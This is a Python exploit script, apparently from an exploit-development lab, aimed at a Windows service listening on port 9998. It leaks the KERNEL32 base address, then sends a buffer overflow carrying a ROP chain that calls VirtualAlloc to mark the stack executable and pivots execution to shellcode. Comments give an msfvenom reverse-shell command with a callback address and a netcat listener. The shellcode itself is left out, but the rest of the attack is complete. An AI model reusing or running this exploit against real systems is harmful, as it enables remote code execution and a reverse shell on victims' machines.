#!/usr/bin/python3

from struct import pack
import pwn
import sys

pwn.context.log_level = "WARNING"

# for RemoteApp2.exe; TCPView => listens on port 9998
SERVER, PORT = None, 9998

def main() :
    global SERVER ; SERVER = sys.argv[1]
    kernel32 = leak(opcode=901, libname="KERNEL32.dll")
    exploit(kernel32)


def leak(opcode, libname):
    buf    = pack("<I", opcode) + libname.encode()
    addr   = parseAddress(sendPayload(wrapPayload(buf)), libname.encode())
    print(f"[+] Leaked address of {libname}: 0x{addr:x}")
    return addr

def wrapPayload(payload):
    """Pass checks / restrictions on input"""
    # note: there are no bad chars
    buf  = b""
    buf += pack("<I", 0xCCCCCCCC)
    buf += pack("<I", 0xAABBCCDD)
    buf += pack("<I", 0xEEFF0102)
    buf += payload
    return buf

def sendPayload(buf):
    p = pwn.remote(SERVER, PORT)
    p.recvuntil(b"Type something: ").decode()
    p.send(buf)
    output = p.recvall(timeout=1)
    p.close()
    return output

def parseAddress(buf, libname):
    return int(buf.split(libname + b": ")[1].split(b"[")[0], 16)

size = 0x800 ; offBufEip = 0x7cc+4
def exploit(kernel32):
    # arbitrary splits for structure of the input buffer
    offBufShellcode        = offBufEip - 0x500
    offBufVirtualallocstub = offBufEip - len(virtualAllocStub())

    buf  = b""
    buf += pack("<I", 902)                              # opcode

    buf += nopsledRop(kernel32, 0x20)
    buf += ropChainVirtualAlloc(kernel32)

    tmpPaddingSize1 = offBufShellcode - len(buf)
    assert tmpPaddingSize1 >= 0
    buf += b"a" * tmpPaddingSize1

    buf += nopsled()
    buf += shellcode()

    tmpPaddingSize2 = offBufVirtualallocstub - len(buf)
    assert tmpPaddingSize2 >= 0
    buf += b"b" * tmpPaddingSize2

    buf += virtualAllocStub(kernel32)

    buf += ropChainBackJump(kernel32)                   # saved EIP is overwritten here

    buf += b"z" * (size - len(buf))

    assert len(buf) == size
    sendPayload(wrapPayload(buf))
    print("[+] Sent exploit; reverse shell should be incoming")

def virtualAllocStub(kernel32=0):
    offKernel32Virtualalloc = 0x238c0
    buf  = b""
    buf += pack("<I", kernel32+offKernel32Virtualalloc) # Address of VirtualAlloc
    buf += b"BBBB"                                      # Return address (shellcode address on stack)
    buf += b"CCCC"                                      # lpAddress (shellcode address on stack)
    buf += pack("<I", 0x1000)                           # dwSize (a page should be enough)
    buf += pack("<I", 0x1000)                           # flAllocationType (0x1000=MEM_COMMIT)
    buf += pack("<I", 0x40)                             # flProtect (0x40=PAGE_EXECUTE_READWRITE)
    return buf

def ropChainBackJump(kernel32=0):
    buf  = b""
    buf += pack("<I", kernel32 + 0x6fa2f)               # push esp ; pop esi ; ret
    buf += pack("<I", kernel32 + 0x712a4)               # mov eax, esi ; pop esi
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", -(offBufEip - 0x10))
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp
    return buf

def ropChainVirtualAlloc(kernel32=0):
    buf  = b""

    # align ecx with shellcode address
    offEaxShellcode = -0x51c
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", offEaxShellcode)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x19a3d)               # mov ecx, eax ; mov eax, ecx ; pop ebp
    buf += b"jjjj"                                      # junk

    # align eax with return address of VirtualAlloc on stack
    offEaxRetaddrslot = 0x4ec
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", offEaxRetaddrslot)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # patch return address on stack
    buf += pack("<I", kernel32 + 0x1cc9b)               # mov  [eax], ecx ; pop ebp ; retn 0x0008
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xfe7b)                # ret
    buf += b"j" * 8                                     # junk

    # align eax with lpAddress on stack
    buf += pack("<I", kernel32 + 0xee5f) * 4            # inc eax

    # patch lpAddress on stack
    buf += pack("<I", kernel32 + 0x1cc9b)               # mov  [eax], ecx ; pop ebp ; retn 0x0008
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xfe7b)                # ret
    buf += b"j" * 8                                     # junk

    # align eax with call to VirtualAlloc
    offEaxVirtualallocstub = -0x8
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", -0x8)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # buf += pack("<I", kernel32 + 0x6dd00)             # int3 (debug gadget)

    # 0:003> dds @eax l6
    # 0114dee8  775438c0 KERNEL32!VirtualAllocStub
    # 0114deec  0114da00
    # 0114def0  0114da00
    # 0114def4  00001000
    # 0114def8  00001000
    # 0114defc  00000040

    # actually stack pivot
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp

    return buf

def nopsled(length=0x10):
    return b"\x90" * length

def nopsledRop(kernel32, length=0x10):
    return pack("<I", kernel32 + 0xfe7b) * length       # ret

def shellcode():
    buf  = b""
    # buf += b"\xcc\x90\x90\x90"                        # int3 / debugging

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.250 LPORT=443 -f python -e x86/xor_dynamic
    # msfvenom -p windows/exec CMD=calc.exe -f python
    # nc -vlnp 443

    # own shellcode works flawlessly; msfvenom for reverse shell doesn't work :( idk why (calc works)

    # python3 ./assemble.py reverse-shell-1.asm  python
    print("[!] Shellcode omitted...") ; exit(1)

    buf += b"\xeb\xfe"
    return buf

if __name__ == "__main__":
    main()
